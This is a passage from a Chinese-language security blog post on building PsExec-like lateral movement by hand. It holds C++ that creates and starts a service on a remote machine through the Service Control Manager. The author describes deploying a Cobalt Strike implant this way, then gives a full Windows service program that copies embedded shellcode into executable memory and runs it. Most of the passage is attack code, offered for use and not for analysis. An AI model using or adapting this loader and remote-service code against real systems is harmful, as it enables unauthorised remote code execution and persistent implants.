class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>先使用<code>OpenSCManager</code>在目标机器上建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</p><p>然后用<code>CreateService</code>创建一个服务,再通过<code>OpenService</code>,<code>StartService</code>打开并开启服务</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreateServices</span><span class="hljs-params">(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">wprintf</span>(<span class="hljs-string">L&quot;Will Create Service %s\n&quot;</span> ,lpwsServiceName);<br>    SC_HANDLE hSCM;<br>    SC_HANDLE hService;<br>    SERVICE_STATUS ss;<br>    hSCM = <span class="hljs-built_in">OpenSCManager</span>(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);<br>    <span class="hljs-keyword">if</span> (hSCM == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenSCManager Error: %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    hService = <span class="hljs-built_in">CreateService</span>(<br>        hSCM, <span class="hljs-comment">// 服务控制管理器数据库的句柄</span><br>        lpwsServiceName, <span class="hljs-comment">// 要安装的服务的名称</span><br>        lpwsServiceName, <span class="hljs-comment">// 用户界面程序用来标识服务的显示名称</span><br>        GENERIC_ALL, <span class="hljs-comment">// 访问权限</span><br>        SERVICE_WIN32_OWN_PROCESS, <span class="hljs-comment">// 与一个或多个其他服务共享一个流程的服务</span><br>        SERVICE_DEMAND_START, <span class="hljs-comment">// 当进程调用StartService函数时，由服务控制管理器启动的服务 。</span><br>        SERVICE_ERROR_IGNORE, <span class="hljs-comment">// 启动程序将忽略该错误并继续启动操作</span><br>        lpwsServicePath, <span class="hljs-comment">// 服务二进制文件的标准路径</span><br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hService == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateService Error: %d\n&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">wprintf</span>(<span class="hljs-string">L&quot;Create Service Success : %s\n&quot;</span>,lpwsServicePath);<br>    hService = <span class="hljs-built_in">OpenService</span>(hSCM, lpwsServiceName, GENERIC_ALL);<br>    <span class="hljs-keyword">if</span> (hService == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenService Error: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OpenService Success: %d!\n&quot;</span>);<br>    <span class="hljs-built_in">StartService</span>(hService, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我生成一个cs的马,改名为sd</p><p><img src="/img/psexec/19.png"></p><p>win2008</p><p><img src="/img/psexec/20.png"></p><p>但是以这种方式运行服务的话一会儿就会掉,随即cs掉线</p><p><img src="/img/psexec/21.png"></p><p>打开系统日志查看</p><p><img src="/img/psexec/22.png"></p><p>我的理解是:要创建一个服务的话这个服务得是满足windows服务规定的格式,而不是随便一个pe文件都可以充当服务</p><h2 id="编写服务程序"><a href="#编写服务程序" class="headerlink" title="编写服务程序"></a>编写服务程序</h2><h3 id="服务介绍"><a href="#服务介绍" class="headerlink" title="服务介绍"></a>服务介绍</h3><p>   几乎所有的操作系统在启动的时候都会启动一些不需要与用户交互的进程，这些进程在Windows中就被称作服务。它通常用于实现客户／服务器模式中的服务器方，如我们常见的Ｗeb服务IIS，当操作系统在启动后它就自动被运行，不管是否有人登陆到系统只要系统开启它就能得到运行。<br>    服务程序、服务控制程序（SCP，service control program）和服务控制管理器（SCM，service control manager）组成了Windows服务。我们可以通过服务控制程序操纵服务控制管理器来配置、启动、暂停、停止服务程序。其中服务程序和服务控制程序可以由我们自己来编写扩展，而服务控制管理器（windowssystem32servics.exe）则是操作系统内置的一个部件。<br>    SCM本身也是一个服务程序（windowssystem32servics.exe），作为windows的后台服务运行的。Winlogon在系统引导的早期会将SCM启动起来。</p><p>可以看一下这篇文章,写的比较详细<br><a href="https://blog.csdn.net/swartz_lubel/article/details/70255686">https://blog.csdn.net/swartz_lubel/article/details/70255686</a></p><p>倾旋博客中也已经给出了一个编写windwos服务的模板<br>还有几篇介绍windows服务编写的:<br> <a href="http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/">http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/</a></p><p><a href="https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus">https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus</a><br>模板代码执行:</p><p><img src="/img/psexec/23.png"></p><p>在模板上面加一点执行shellcode的代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = shellcode<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SLEEP_TIME 5000                          <span class="hljs-comment">/*间隔时间*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOGFILE <span class="hljs-meta-string">&quot;C:\\Windows\\log.txt&quot;</span>              <span class="hljs-comment">/*信息输出文件*/</span></span><br><br>SERVICE_STATUS ServiceStatus;  <span class="hljs-comment">/*服务状态*/</span><br>SERVICE_STATUS_HANDLE hStatus; <span class="hljs-comment">/*服务状态句柄*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>   <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, CHAR* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sdd&quot;</span>);<br>    SERVICE_TABLE_ENTRY ServiceTable[<span class="hljs-number">2</span>];<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceName = WserviceName;<br>    ServiceTable[<span class="hljs-number">0</span>].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceName = <span class="hljs-literal">NULL</span>;<br>    ServiceTable[<span class="hljs-number">1</span>].lpServiceProc = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">StartServiceCtrlDispatcher</span>(ServiceTable);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">WriteToLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* str)</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE* pfile;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;pfile, LOGFILE, <span class="hljs-string">&quot;a+&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pfile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">fprintf_s</span>(pfile, <span class="hljs-string">&quot;%s\n&quot;</span>, str);<br>    <span class="hljs-built_in">fclose</span>(pfile);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*Service initialization*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">InitService</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    CHAR Message[] = <span class="hljs-string">&quot;Monitoring started.&quot;</span>;<br>    <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;Monitoring started.&quot;</span>));<br>    <span class="hljs-keyword">int</span> result;<br>    result = <span class="hljs-built_in">WriteToLog</span>(Message);<br><br>    <span class="hljs-keyword">return</span>(result);<br>&#125;<br><br><span class="hljs-comment">/*Control Handler*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CtrlHandler</span><span class="hljs-params">(DWORD request)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (request)<br>    &#123;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_STOP:<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">case</span> SERVICE_CONTROL_SHUTDOWN:<br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;Monitoring stopped.&quot;</span>);<br><br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>        ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Report current status  */</span><br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ServiceMain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    WCHAR WserviceName[] = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;sdd&quot;</span>);<br>    <span class="hljs-keyword">int</span> error;<br>    ServiceStatus.dwServiceType =<br>        SERVICE_WIN32;<br>    ServiceStatus.dwCurrentState =<br>        SERVICE_START_PENDING;<br>    <span class="hljs-comment">/*在本例中只接受系统关机和停止服务两种控制命令*/</span><br>    ServiceStatus.dwControlsAccepted =<br>        SERVICE_ACCEPT_SHUTDOWN |<br>        SERVICE_ACCEPT_STOP;<br>    ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwServiceSpecificExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwCheckPoint = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwWaitHint = <span class="hljs-number">0</span>;<br>    hStatus = ::<span class="hljs-built_in">RegisterServiceCtrlHandler</span>(<br>        WserviceName,<br>        (LPHANDLER_FUNCTION)CtrlHandler);<br>    <span class="hljs-keyword">if</span> (hStatus == (SERVICE_STATUS_HANDLE)<span class="hljs-number">0</span>)<br>    &#123;<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler failed&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler success&quot;</span>);<br>    <span class="hljs-comment">/* Initialize Service   */</span><br>    error = <span class="hljs-built_in">InitService</span>();<br>    <span class="hljs-keyword">if</span> (error)<br>    &#123;<br>        <span class="hljs-comment">/* Initialization failed  */</span><br>        ServiceStatus.dwCurrentState =<br>            SERVICE_STOPPED;<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    LPVOID Memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>    ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(*)())Memory)();<br><br>    <span class="hljs-comment">/*向SCM 报告运行状态*/</span><br>    ServiceStatus.dwCurrentState =<br>        SERVICE_RUNNING;<br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br><br>    <span class="hljs-comment">/*do something you want to do in this while loop*/</span><br>    MEMORYSTATUS memstatus;<br>    <span class="hljs-keyword">while</span> (ServiceStatus.dwCurrentState ==<br>        SERVICE_RUNNING)<br>    &#123;<br>        <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">16</span>];<br>        <span class="hljs-built_in">GlobalMemoryStatus</span>(&amp;memstatus);<br>        <span class="hljs-keyword">int</span> availmb = memstatus.dwAvailPhys / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>;<br>        <span class="hljs-built_in">sprintf_s</span>(buffer, <span class="hljs-number">100</span>, <span class="hljs-string">&quot;available memory is %dMB&quot;</span>, availmb);<br>        <span class="hljs-keyword">int</span> result = <span class="hljs-built_in">WriteToLog</span>(buffer);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>            ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>            <span class="hljs-built_in">SetServiceStatus</span>(hStatus,<br>                &amp;ServiceStatus);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-built_in">Sleep</span>(SLEEP_TIME);<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;service stopped&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/24.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://payloads.online/archivers/2020-04-02/1">https://payloads.online/archivers/2020-04-02/1</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108455478">https://blog.csdn.net/qq_41874930/article/details/108455478</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
